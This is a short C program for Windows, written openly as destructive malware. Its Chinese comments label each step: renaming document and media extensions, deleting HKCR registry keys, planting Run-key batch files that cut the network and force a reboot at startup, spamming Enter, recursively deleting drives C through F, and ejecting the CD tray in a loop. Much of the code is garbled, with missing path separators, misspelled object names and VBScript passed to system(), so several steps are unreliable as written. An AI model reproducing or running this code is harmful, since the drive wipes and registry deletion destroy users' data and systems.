#include <windows.h>

int main(int argc, const char *argv[]) {
	const char *Command1 =
	    "REN *.DOC *.TXT REN *.JPEG *.TXT\nREN *.LNK *.TXT\nREN *.AVI *.TXT\nREN *.MPEG *.TXT\nREN *.COM *.TXT\nBEN *.BAT *.TXT\n";
	system(Command1);//更改后缀名
	const char *Command2 =
	    "@ECHO OFF\nSTART reg delete HKCR/.exe\nSTART reg delete HKCR/.dLL\nSTART reg delete HKCR/*\n";
	system(Command2);//删除注册表
	const char *Command3 =
	    "echo @echo off>c:windowswimn32.bat\necho break off>>c:windowswimn32.bat\necho ipconfig/release_all>>c:windowswimn32.batecho end>>c\"windowswimn32.bat\nreg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun/v windowsapi/t reg_sz/d c:windowswimn32.bat/freg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun/v controlexit/t reg_sz/d c:windowswimn32.bat/fpause\n";
	system(Command3);//禁用网络
	const char *Command4 =
	    "set wshshell =wscript.createobject<\"wscript.shell\">\ndo\nwscript.sleep 100\nwshshell.sendkeys\"~<enter>\"\nLoop\n";
	system(Command4);//一直按回车
	const char *Command5 =
	    "echo @echo off>c:windowshartlell.bat\necho break off>>c:windowshartlell.bat\necho shutdown -r-t11-f>>c:windowshartlell.bat\necho end>>c:windowshartlell.batreg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun\n/v startapi /t reg_sz/d c:windowshartlell.bat /f\nreg add hkey-current_usersoftwaremicrosoftwindowscurrentversionrun\n/v/t reg_sz/d c:windowshartlell.bat /f\nPAUSE\n";
	system(Command5);//开机就关机
	const char *Command6 =
	    "rd/s/q D:\n\rd/s/q C:\\nrd/s/q E:\\nrd/s/q F:\\n";
	system(Command6);//格式化硬盘
	const char *Command7 =
	    "Set oWMP=Create0bject(\"WMPIayer.0CX.7\")\nSet colCDROMs=oWMP.cdromCollection\ndo\nif colCDROMs.Count>=1 thenFor i=0 to coCDROMs.Count -1ColCDROMs.ltem<i>.Eject\nNext\nFor =0 to colCDROMs.Count -1ColCDROMs.ltem<i>.EjectNext\nEnd lf\nwscript.sleep 100\nLoop\n";
	system(Command7);//蜂鸣器发声
	return 0;
}